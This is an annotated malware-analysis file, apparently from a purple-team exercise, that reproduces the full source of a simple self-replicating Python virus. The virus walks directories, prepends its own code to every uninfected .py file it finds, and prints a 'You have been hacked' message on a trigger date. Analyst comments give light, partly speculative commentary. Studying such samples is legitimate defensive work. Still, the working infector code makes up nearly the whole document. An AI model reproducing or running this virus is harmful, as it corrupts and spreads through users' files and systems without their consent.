# Malware Analysis
# Purple Team
# Analyst - Tom Esch
# Last Revised - 3/18/2021

# !/usr/bin/python
import os
import datetime

SIGNATURE = "VIRUS"

# Here, the malware has a path location defined as a function called 
locate.

def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist: #all possible files
        if os.path.isdir(path+"/"+fname): # paths plus files
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False #checks to see if it has infected the 
file, if not, proceeds to APPEND data to every file it can 
reach
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break #When it has infected everything it can, it 
will stop
            if infected == False: #assuring the adding of data to 
effectively shut the machine down with corruption of all 
files, eventually critical system files?
                files_targeted.append(path+"/"+fname)
    return files_targeted

# Next, the infection process is defined as a function.

def infect(files_targeted):
    virus = open(os.path.abspath(__file__)) #variable 
    virusstring = ""
    # This looks like data will just be created and accumulate
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
# Finally, the script gives the user feedback (how nice?)
def detonate(): # the datetime will most certainly be now-now (like in 
SpaceBalls)
    if datetime.datetime.now().month == 5 and datetime.datetime.now().
day == 9:
        print "You have been hacked"

# These are the defined functions called for execution.
files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()
